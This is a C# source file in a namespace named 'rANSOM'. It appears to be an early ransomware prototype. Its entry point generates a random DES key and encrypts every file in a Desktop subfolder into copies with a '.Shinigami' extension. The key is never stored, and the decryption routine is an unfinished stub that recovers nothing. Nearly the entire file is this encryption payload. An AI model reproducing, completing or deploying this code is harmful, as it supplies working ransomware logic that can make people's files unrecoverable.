using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace rANSOM
{
    static class Program
    {


        //  Call this function to remove the key from memory after use for security
        [System.Runtime.InteropServices.DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
        public static extern bool ZeroMemory(IntPtr Destination, int Length);

        // Function to Generate a 64 bits Key.
        static DESCryptoServiceProvider GenerateKey()
        {
            // Create an instance of Symetric Algorithm. Key and IV is generated automatically.
            DESCryptoServiceProvider desCrypto = (DESCryptoServiceProvider)DESCryptoServiceProvider.Create();

            // Use the Automatically generated key for Encryption. 
            return desCrypto;
        }

        static void EncryptFile(string beginning, DESCryptoServiceProvider sKey)
        {
            string[] files = Directory.GetFiles(beginning);
            foreach (string currentFile in files)
            {

                FileStream fsInput = new FileStream(currentFile, FileMode.Open, FileAccess.Read);

                FileStream fsEncrypted = new FileStream(currentFile + ".Shinigami", FileMode.Create, FileAccess.Write);
                DESCryptoServiceProvider DES = new DESCryptoServiceProvider();
                DES.Key = sKey.Key;
                DES.IV = sKey.IV;
                ICryptoTransform desencrypt = DES.CreateEncryptor();
                CryptoStream cryptostream = new CryptoStream(fsEncrypted, desencrypt, CryptoStreamMode.Write);

                byte[] bytearrayinput = new byte[fsInput.Length];
                fsInput.Read(bytearrayinput, 0, bytearrayinput.Length);
                cryptostream.Write(bytearrayinput, 0, bytearrayinput.Length);
                cryptostream.Close();
                fsInput.Close();
                fsEncrypted.Close();
            }
        }

        static void DecryptFile(string beginning,DESCryptoServiceProvider sKey)
        {
            string[] files = Directory.GetFiles(beginning);

            DESCryptoServiceProvider DES = new DESCryptoServiceProvider();
            //A 64 bit key and IV is required for this provider.
            //Set secret key For DES algorithm.
            DES.Key = sKey.Key;
            //Set initialization vector.
            DES.IV = sKey.IV;
            foreach (string currentFile in files)
            {
                //Create a file stream to read the encrypted file back.
                FileStream fsread = new FileStream(currentFile, FileMode.Open, FileAccess.Read);
            }

        }




        /// <summary>
        /// Главная точка входа для приложения.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            // Must be 64 bits, 8 bytes.
            // Distribute this key to the user who will decrypt this file.
            DESCryptoServiceProvider sSecretKey;

            // Get the Key for the file to Encrypt.
            sSecretKey = GenerateKey();

            // For additional security Pin the key.
            GCHandle gch = GCHandle.Alloc(sSecretKey.Key, GCHandleType.Pinned);
            List<string> pathsToEncrypt = new List<string>();
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\2");
            foreach (string currentPath in pathsToEncrypt)
            {
                EncryptFile(currentPath, sSecretKey);
            }
            // Encrypt the file.        
            // EncryptFile(@"d:\2.txt",sSecretKey);

         

            gch.Free();

          //  Application.Run(new Form1());
        }
    }
}
